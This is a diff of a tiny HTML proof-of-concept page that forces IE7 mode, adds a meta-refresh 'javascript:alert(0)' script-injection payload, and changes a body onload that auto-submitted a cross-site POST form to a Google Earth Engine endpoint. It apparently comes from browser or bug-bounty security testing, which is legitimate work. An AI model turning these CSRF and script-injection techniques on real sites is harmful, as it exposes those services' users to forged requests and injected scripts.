@@ -1,15 +1,17 @@
 <meta http-equiv="X-UA-Compatible" content="IE=7" >
+<meta http-equiv="refresh" content=" 0, url='javascript:alert(0)'">
 <script>alert(document.documentMode)</script>
+
+
 
 <!DOCTYPE html>
 <html>
 <head>
 	<title></title>
 </head>
-<body onload="document.getElementById('xss').submit();">
+<body onload="document.getElementById('xss')">
 
 <form  id="xss" action="https://explorer.earthengine.google.com/getProject" method="POST"></form>
-
 
 
 </body>
